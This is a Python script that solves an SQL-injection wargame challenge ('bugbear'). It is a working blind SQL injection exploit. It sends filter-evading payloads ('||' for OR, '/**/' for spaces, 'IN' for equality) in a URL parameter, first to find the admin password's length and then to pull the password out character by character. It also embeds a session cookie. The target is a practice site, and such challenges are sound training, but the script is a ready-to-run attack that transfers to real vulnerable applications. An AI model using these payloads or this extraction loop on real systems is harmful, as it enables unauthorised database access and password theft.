# Using dark knight as a base script

import requests as req
import string
import threading
import  urllib.parse

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php";

cookie = {
    "PHPSESSID":"vekfe8it87fog8t4phd0psi93t"
}

r = req.get(url,cookies=cookie)

# Find the length of the password
def get_passlength():
    for i in range(1,10):
        res = req.get(url, params={"no": f'-1/**/||/**/length(pw)/**/IN("{i}")/**/--+'}, cookies=cookie)
        print(f"Sent request {urllib.parse.unquote(res.url)}")
        if "Hello admin" in res.text:
            print(f"The length of password is {i}");
            break;
# Got the length as 8


def get_pass():
    '''
    
    '''
    pas = "";
    for i in range(1,9):
        for j in range(ord('0'),ord('z')):
            res = req.get(url,params={"no":f'-1/**/||/**/mid(pw,1,{str(i)})/**/IN("{pas+chr(j)}")/**/--'},cookies=cookie,verify=False);
            print(f"Sent request {urllib.parse.unquote(res.url)}")
            if "Hello admin" in res.text:
                pas += chr(j)
                print(f"Got a character {chr(j)}");
                break;
            """  else:
                res = req.get(url,params={"no":f"-1 or MID(pw,{i},1) like {j}  --"},cookies=cookie,verify=False);
                if "Hello admin" in res.text:
                    pas += chr(j)
                    print(f"Got a character {j}");
                    break; """

            
    print(pas)

if __name__ == '__main__':
    #threading.Thread(target=get_passlength).start()
    #get_passlength()
    get_pass();

# SQL is left to right associative

# Cleared